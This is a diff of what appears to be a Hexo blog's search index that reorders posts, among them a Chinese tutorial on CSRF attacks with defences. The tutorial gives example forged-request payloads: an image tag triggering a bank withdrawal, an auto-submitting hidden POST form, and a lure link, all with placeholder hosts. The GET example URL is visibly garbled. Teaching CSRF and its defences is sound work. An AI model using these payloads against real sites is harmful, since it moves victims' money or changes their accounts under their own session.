@@ -60,6 +60,52 @@
 <h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1>]]></content>
   </entry>
   <entry>
+    <title>CSRF攻击</title>
+    <url>/post/44b0db89.html</url>
+    <content><![CDATA[<p>　　学习了这部分之后，我感觉之前qq空间链接的那种盗号方式，应该就是这个原理<span id="more"></span></p>
+<h1 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h1><p>　　跨站请求伪造（Cross-site request forgery，CSRF），也被称为one click attack/session riding，通常缩写是CSRF/XSRF。</p>
+<h1 id="2-CSRF可以做些什么"><a href="#2-CSRF可以做些什么" class="headerlink" title="2.CSRF可以做些什么"></a>2.CSRF可以做些什么</h1><p>　　可以简单理解为：<font color="ff0000">攻击者盗用了你的身份，以你的名义发送恶意请求</font>，它利用网站对用户网页浏览器的信任。如：转移资金、修改电子邮件地址、密码。    </p>
+<h1 id="3-CSRF原理"><a href="#3-CSRF原理" class="headerlink" title="3.CSRF原理"></a>3.CSRF原理</h1><p>　　<font color="ff0000">受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</font></p>
+<p>　　<font color="ff0000">黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</font></p>
+<p>　　<font color="ff0000">这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </font></p>
+<p><img src="https://s3.ax1x.com/2021/01/11/s1xb59.png" alt="s1xb59.png"></p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Bob打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在Bob信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时Bob登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span>Bob未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span>这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">   src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=hacker</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span>浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在Bob不知情的情况下携带Cookie信息，根据用户的Cookie信息以Bob的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>
+<h1 id="4-CSRF攻击类型"><a href="#4-CSRF攻击类型" class="headerlink" title="4.CSRF攻击类型"></a>4.CSRF攻击类型</h1><h2 id="4-1-GET类型的CSRF"><a href="#4-1-GET类型的CSRF" class="headerlink" title="4.1 GET类型的CSRF"></a>4.1 GET类型的CSRF</h2><p>GET类型的CSRF利用非常简单，只需要HTTP请求，一般这样利用：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">![](https:<span class="regexp">//</span>awps-assets.meituan.net<span class="regexp">/mit-x/</span>blog-images-bundle-<span class="number">2018</span>b<span class="regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="number">10000</span>&amp;<span class="keyword">for</span>=hacker)</span><br></pre></td></tr></table></figure>
+<p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p>
+<h2 id="4-2-POST类型的CSRF"><a href="#4-2-POST类型的CSRF" class="headerlink" title="4.2 POST类型的CSRF"></a>4.2 POST类型的CSRF</h2><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--自动提交表单--&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure>
+<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。POST类型的攻击通常比GET要求更加严格一点，但扔并不复杂。任何个人网站、博客，被黑客上传页面的往回走哪都有可能是发起攻击的来源。</p>
+<h2 id="4-3-链接类型的CSRF"><a href="#4-3-链接类型的CSRF" class="headerlink" title="4.3 链接类型的CSRF"></a>4.3 链接类型的CSRF</h2><p>这种需要用户点击链接才会触发。这种类型通常是杂论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，例如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> taget=<span class="string">&quot;_blank&quot;</span>&gt;</span><br><span class="line">  重磅消息！！</span><br><span class="line">  &lt;a/&gt;</span><br></pre></td></tr></table></figure>
+<p>由于之前用户登陆的信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，就表示攻击成功。</p>
+<h1 id="5-CSRF的特点"><a href="#5-CSRF的特点" class="headerlink" title="5.CSRF的特点"></a>5.CSRF的特点</h1><ul>
+<li>攻击一般发起在第三方网站，而不是被攻击的网站。</li>
+<li>攻击利用受害者在被攻击网站的登陆凭证，冒充受害者提交操作。</li>
+<li>整个过程攻击者并不能获取到受害者的登陆凭证，仅仅是冒用。</li>
+</ul>
+<h1 id="6-防护措施"><a href="#6-防护措施" class="headerlink" title="6.防护措施"></a>6.防护措施</h1><h2 id="6-1-验证HTTP-Referer字段"><a href="#6-1-验证HTTP-Referer字段" class="headerlink" title="6.1 验证HTTP Referer字段"></a>6.1 验证HTTP Referer字段</h2><p>HTTP头中有一个Referer的字段，它记录了该HTTP请求的来源网址</p>
+<p><img src="https://s3.ax1x.com/2021/01/11/s1xHUJ.png" alt="s1xHUJ.png"></p>
+<p>　　也就是说，服务器会验证客户端的请求来源，如果是本网站请求的就响应，否则不响应。</p>
+<p>　　正如上文所提到的，Bob必须登录银行网站，通过页面上的按钮触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。黑客只能在自己网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向黑客的网站。所以不能响应。</p>
+<p>但是这种方式仍然<font color="ff000">存在安全隐患</font></p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>对于某些浏览器，比如IE6或FF2，目前已经有一些方法可以篡改Referer值</span><br><span class="line"><span class="number">2.</span>用户自己可以这只浏览器使其请求时不再提供Referer</span><br></pre></td></tr></table></figure>
+<h2 id="6-2-使用token（Anti-CSRF-Token）"><a href="#6-2-使用token（Anti-CSRF-Token）" class="headerlink" title="6.2 使用token（Anti CSRF Token）"></a>6.2 使用token（Anti CSRF Token）</h2><p>可以理解为防伪</p>
+<p>例子：</p>
+<p>1.用户访问某个表单页面。</p>
+<p>2.服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p>
+<p>3.在页面表单附带上Token参数。</p>
+<p>4.用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的      Token一致，一致为合法请求，不是则非法请求。</p>
+<p>　　这个Token的值必须是随机的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为<code>POST</code>，以form或AJAX形式提交，避免Token泄露。</p>
+]]></content>
+      <categories>
+        <category>网络安全知识学习</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CSS学习</title>
     <url>/post/238675c9.html</url>
     <content><![CDATA[<p>基本了解CSS<span id="more"></span></p>
@@ -187,52 +233,6 @@
       <categories>
         <category>第一届DMCTF夺旗赛</category>
       </categories>
-  </entry>
-  <entry>
-    <title>CSRF攻击</title>
-    <url>/post/44b0db89.html</url>
-    <content><![CDATA[<p>　　学习了这部分之后，我感觉之前qq空间链接的那种盗号方式，应该就是这个原理<span id="more"></span></p>
-<h1 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h1><p>　　跨站请求伪造（Cross-site request forgery，CSRF），也被称为one click attack/session riding，通常缩写是CSRF/XSRF。</p>
-<h1 id="2-CSRF可以做些什么"><a href="#2-CSRF可以做些什么" class="headerlink" title="2.CSRF可以做些什么"></a>2.CSRF可以做些什么</h1><p>　　可以简单理解为：<font color="ff0000">攻击者盗用了你的身份，以你的名义发送恶意请求</font>，它利用网站对用户网页浏览器的信任。如：转移资金、修改电子邮件地址、密码。    </p>
-<h1 id="3-CSRF原理"><a href="#3-CSRF原理" class="headerlink" title="3.CSRF原理"></a>3.CSRF原理</h1><p>　　<font color="ff0000">受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</font></p>
-<p>　　<font color="ff0000">黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</font></p>
-<p>　　<font color="ff0000">这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </font></p>
-<p><img src="https://s3.ax1x.com/2021/01/11/s1xb59.png" alt="s1xb59.png"></p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Bob打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在Bob信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时Bob登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span>Bob未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span>这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">   src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=hacker</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span>浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在Bob不知情的情况下携带Cookie信息，根据用户的Cookie信息以Bob的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>
-<h1 id="4-CSRF攻击类型"><a href="#4-CSRF攻击类型" class="headerlink" title="4.CSRF攻击类型"></a>4.CSRF攻击类型</h1><h2 id="4-1-GET类型的CSRF"><a href="#4-1-GET类型的CSRF" class="headerlink" title="4.1 GET类型的CSRF"></a>4.1 GET类型的CSRF</h2><p>GET类型的CSRF利用非常简单，只需要HTTP请求，一般这样利用：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">![](https:<span class="regexp">//</span>awps-assets.meituan.net<span class="regexp">/mit-x/</span>blog-images-bundle-<span class="number">2018</span>b<span class="regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="number">10000</span>&amp;<span class="keyword">for</span>=hacker)</span><br></pre></td></tr></table></figure>
-<p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p>
-<h2 id="4-2-POST类型的CSRF"><a href="#4-2-POST类型的CSRF" class="headerlink" title="4.2 POST类型的CSRF"></a>4.2 POST类型的CSRF</h2><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--自动提交表单--&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure>
-<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。POST类型的攻击通常比GET要求更加严格一点，但扔并不复杂。任何个人网站、博客，被黑客上传页面的往回走哪都有可能是发起攻击的来源。</p>
-<h2 id="4-3-链接类型的CSRF"><a href="#4-3-链接类型的CSRF" class="headerlink" title="4.3 链接类型的CSRF"></a>4.3 链接类型的CSRF</h2><p>这种需要用户点击链接才会触发。这种类型通常是杂论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，例如：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> taget=<span class="string">&quot;_blank&quot;</span>&gt;</span><br><span class="line">  重磅消息！！</span><br><span class="line">  &lt;a/&gt;</span><br></pre></td></tr></table></figure>
-<p>由于之前用户登陆的信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，就表示攻击成功。</p>
-<h1 id="5-CSRF的特点"><a href="#5-CSRF的特点" class="headerlink" title="5.CSRF的特点"></a>5.CSRF的特点</h1><ul>
-<li>攻击一般发起在第三方网站，而不是被攻击的网站。</li>
-<li>攻击利用受害者在被攻击网站的登陆凭证，冒充受害者提交操作。</li>
-<li>整个过程攻击者并不能获取到受害者的登陆凭证，仅仅是冒用。</li>
-</ul>
-<h1 id="6-防护措施"><a href="#6-防护措施" class="headerlink" title="6.防护措施"></a>6.防护措施</h1><h2 id="6-1-验证HTTP-Referer字段"><a href="#6-1-验证HTTP-Referer字段" class="headerlink" title="6.1 验证HTTP Referer字段"></a>6.1 验证HTTP Referer字段</h2><p>HTTP头中有一个Referer的字段，它记录了该HTTP请求的来源网址</p>
-<p><img src="https://s3.ax1x.com/2021/01/11/s1xHUJ.png" alt="s1xHUJ.png"></p>
-<p>　　也就是说，服务器会验证客户端的请求来源，如果是本网站请求的就响应，否则不响应。</p>
-<p>　　正如上文所提到的，Bob必须登录银行网站，通过页面上的按钮触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。黑客只能在自己网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向黑客的网站。所以不能响应。</p>
-<p>但是这种方式仍然<font color="ff000">存在安全隐患</font></p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>对于某些浏览器，比如IE6或FF2，目前已经有一些方法可以篡改Referer值</span><br><span class="line"><span class="number">2.</span>用户自己可以这只浏览器使其请求时不再提供Referer</span><br></pre></td></tr></table></figure>
-<h2 id="6-2-使用token（Anti-CSRF-Token）"><a href="#6-2-使用token（Anti-CSRF-Token）" class="headerlink" title="6.2 使用token（Anti CSRF Token）"></a>6.2 使用token（Anti CSRF Token）</h2><p>可以理解为防伪</p>
-<p>例子：</p>
-<p>1.用户访问某个表单页面。</p>
-<p>2.服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p>
-<p>3.在页面表单附带上Token参数。</p>
-<p>4.用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的      Token一致，一致为合法请求，不是则非法请求。</p>
-<p>　　这个Token的值必须是随机的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为<code>POST</code>，以form或AJAX形式提交，避免Token泄露。</p>
-]]></content>
-      <categories>
-        <category>网络安全知识学习</category>
-      </categories>
-      <tags>
-        <tag>CSRF</tag>
-      </tags>
   </entry>
   <entry>
     <title>Docker下logstash同步mysql和elasticsearch</title>
@@ -497,57 +497,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Github+PicGo图床搭建</title>
-    <url>/post/febc4fee.html</url>
-    <content><![CDATA[<p>　　github+PicGo图床配置简单教程<span id="more"></span></p>
-<h1 id="1-Github新建仓库"><a href="#1-Github新建仓库" class="headerlink" title="1.Github新建仓库"></a>1.Github新建仓库</h1><p>点击new repository新建仓库</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175629464.png" alt="image-20210526175629464"></p>
-<p>仓库名可以随便取，我这里取得是cdn，Initialize this repository with a README 可点可不点，我这里没点</p>
-<p>然后点击 create repository即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175747194.png" alt="image-20210526175747194"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175756052.png" alt="image-20210526175756052"></p>
-<p>找到页面最下面的<code>Developer settings</code>，点击进入；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175911572.png" alt="image-20210526175911572"></p>
-<p>创建token；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175949415.png" alt="image-20210526175949415"></p>
-<p>填 description（也是随心填），勾选复选框 repo ，接着到页面底部 <code>Generate token</code> 就完成了；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180007585.png" alt="image-20210526180007585"></p>
-<p>然后复制生成一串字符 token，这个 token 只出现一次，所以要保存一下（我一般记在微信收藏）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180023130.png" alt="image-20210526180023130"></p>
-<h1 id="2-PicGo配置"><a href="#2-PicGo配置" class="headerlink" title="2.PicGo配置"></a>2.PicGo配置</h1><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180142878.png" alt="image-20210526180142878"></p>
-<p>仓库名 即你的仓库名</p>
-<p>分支名 默认 master</p>
-<p>Token 就是刚刚复制的那一串字符</p>
-<p>存储路径 这个可以填也可以不填，填了的话图片就上传到 git 中 data 这个文件夹</p>
-<p>域名 <a href="https://raw.githubusercontent.com/qnjy/images/main这个要改一下">https://raw.githubusercontent.com/qnjy/images/main这个要改一下</a> 格式 <a href="https://raw.githubusercontent.com/[username]/[仓库名]/main">https://raw.githubusercontent.com/[username]/[仓库名]/main</a></p>
-<p><strong>cdn加速访问</strong></p>
-<blockquote>
-<p>将上面的域名改为：<br>原 <a href="https://raw.githubusercontent.com/qnjy/images/main">https://raw.githubusercontent.com/qnjy/images/main</a><br>现 <a href="https://cdn.jsdelivr.net/gh/qnjy/images@main">https://cdn.jsdelivr.net/gh/qnjy/images@main</a></p>
-</blockquote>
-<p><strong>安装插件rename-file</strong></p>
-<p>可以自定义图片的名称的名称，保存图片的路径 等，方便自己查找</p>
-<p>命名规则：</p>
-<p>{y} 年，4位</p>
-<p>{m} 月，2位</p>
-<p>{d} 日期，2位</p>
-<p>{h} 小时，2位</p>
-<p>{i} 分钟，2位</p>
-<p>{s} 秒，2位</p>
-<p>{ms} 毫秒，3位(v1.0.4)</p>
-<p>{timestamp} 时间戳(秒)，10位(v1.0.4)</p>
-<p>{hash}，文件的md5值，32位</p>
-<p>{origin}，文件原名（会去掉后缀）</p>
-<p>{rand:}, 随机数，表示个数，默认为6个，示例：{rand：32}、{rand}</p>
-<p>{localFolder:}, 表示层级 ，默认为1，示例：{localFolder:6}、{localFolder}</p>
-<p>我的使用的是 时间戳+原名</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180509507.png" alt="image-20210526180509507"></p>
-<p>gitee的配置图：</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20210802-image-20210802231317873.png" alt="image-20210802231317873"></p>
-<p>参考链接：<a href="https://segmentfault.com/a/1190000038610252">https://segmentfault.com/a/1190000038610252</a></p>
-<h1 id="3-Typora配置"><a href="#3-Typora配置" class="headerlink" title="3.Typora配置"></a>3.Typora配置</h1><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180402751.png" alt="image-20210526180402751"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>HTML学习</title>
     <url>/post/9b6eaec3.html</url>
     <content><![CDATA[<p>　　了解HTML的基本属性<span id="more"></span></p>
@@ -648,6 +597,57 @@
       <tags>
         <tag>HTML</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Github+PicGo图床搭建</title>
+    <url>/post/febc4fee.html</url>
+    <content><![CDATA[<p>　　github+PicGo图床配置简单教程<span id="more"></span></p>
+<h1 id="1-Github新建仓库"><a href="#1-Github新建仓库" class="headerlink" title="1.Github新建仓库"></a>1.Github新建仓库</h1><p>点击new repository新建仓库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175629464.png" alt="image-20210526175629464"></p>
+<p>仓库名可以随便取，我这里取得是cdn，Initialize this repository with a README 可点可不点，我这里没点</p>
+<p>然后点击 create repository即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175747194.png" alt="image-20210526175747194"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175756052.png" alt="image-20210526175756052"></p>
+<p>找到页面最下面的<code>Developer settings</code>，点击进入；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175911572.png" alt="image-20210526175911572"></p>
+<p>创建token；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526175949415.png" alt="image-20210526175949415"></p>
+<p>填 description（也是随心填），勾选复选框 repo ，接着到页面底部 <code>Generate token</code> 就完成了；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180007585.png" alt="image-20210526180007585"></p>
+<p>然后复制生成一串字符 token，这个 token 只出现一次，所以要保存一下（我一般记在微信收藏）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180023130.png" alt="image-20210526180023130"></p>
+<h1 id="2-PicGo配置"><a href="#2-PicGo配置" class="headerlink" title="2.PicGo配置"></a>2.PicGo配置</h1><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180142878.png" alt="image-20210526180142878"></p>
+<p>仓库名 即你的仓库名</p>
+<p>分支名 默认 master</p>
+<p>Token 就是刚刚复制的那一串字符</p>
+<p>存储路径 这个可以填也可以不填，填了的话图片就上传到 git 中 data 这个文件夹</p>
+<p>域名 <a href="https://raw.githubusercontent.com/qnjy/images/main这个要改一下">https://raw.githubusercontent.com/qnjy/images/main这个要改一下</a> 格式 <a href="https://raw.githubusercontent.com/[username]/[仓库名]/main">https://raw.githubusercontent.com/[username]/[仓库名]/main</a></p>
+<p><strong>cdn加速访问</strong></p>
+<blockquote>
+<p>将上面的域名改为：<br>原 <a href="https://raw.githubusercontent.com/qnjy/images/main">https://raw.githubusercontent.com/qnjy/images/main</a><br>现 <a href="https://cdn.jsdelivr.net/gh/qnjy/images@main">https://cdn.jsdelivr.net/gh/qnjy/images@main</a></p>
+</blockquote>
+<p><strong>安装插件rename-file</strong></p>
+<p>可以自定义图片的名称的名称，保存图片的路径 等，方便自己查找</p>
+<p>命名规则：</p>
+<p>{y} 年，4位</p>
+<p>{m} 月，2位</p>
+<p>{d} 日期，2位</p>
+<p>{h} 小时，2位</p>
+<p>{i} 分钟，2位</p>
+<p>{s} 秒，2位</p>
+<p>{ms} 毫秒，3位(v1.0.4)</p>
+<p>{timestamp} 时间戳(秒)，10位(v1.0.4)</p>
+<p>{hash}，文件的md5值，32位</p>
+<p>{origin}，文件原名（会去掉后缀）</p>
+<p>{rand:}, 随机数，表示个数，默认为6个，示例：{rand：32}、{rand}</p>
+<p>{localFolder:}, 表示层级 ，默认为1，示例：{localFolder:6}、{localFolder}</p>
+<p>我的使用的是 时间戳+原名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180509507.png" alt="image-20210526180509507"></p>
+<p>gitee的配置图：</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20210802-image-20210802231317873.png" alt="image-20210802231317873"></p>
+<p>参考链接：<a href="https://segmentfault.com/a/1190000038610252">https://segmentfault.com/a/1190000038610252</a></p>
+<h1 id="3-Typora配置"><a href="#3-Typora配置" class="headerlink" title="3.Typora配置"></a>3.Typora配置</h1><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180402751.png" alt="image-20210526180402751"></p>
+]]></content>
   </entry>
   <entry>
     <title>Hadoop集群环境搭建1</title>
@@ -831,36 +831,6 @@
       <categories>
         <category>环境搭建</category>
       </categories>
-  </entry>
-  <entry>
-    <title>IDEA使用$符号失效问题</title>
-    <url>/post/7fbc5666.html</url>
-    <content><![CDATA[<p>　　今天在使用IDEA开发maven项目的时候遇到不加载EL表达式的问题<span id="more"></span><br><img src="https://s3.ax1x.com/2020/12/15/rMuP41.png" alt="rMuP41.png">]</p>
-<p>结果却显示为</p>
-<p><img src="https://s3.ax1x.com/2020/12/15/rMuF9x.png" alt="rMuF9x.png">]</p>
-<font color="ff0000">解决办法</font>
-
-<p>在jsp开头添加</p>
-<figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page isELIgnored=<span class="string">&quot;false&quot;</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p>isELIgnored是指是否忽略EL表达式</p>
-<p>之所以形成这种问题，是因为JSP2.0以上isELIgnored默认是true</p>
-<p>isELIgnored 属性JSP 2.0 新引入的属性，在只支持 JSP 1.2  及早期版本的服务器中，使用这项属性是不合法的。这个属性的默认值依赖于 Web 应用所使用的 web.xml 的版本。如果 web.xml 指定  servlet 2.3（对应JSP 1.2）或更早版本，默认值为 true（但变更默认值依旧是合法的，JSP 2.0  兼容的服务器中都允许使用这项属性，不管 web.xml 的版本如何）</p>
-<p>查看Servlet版本</p>
-<p>打开web.xml文件就可以看到</p>
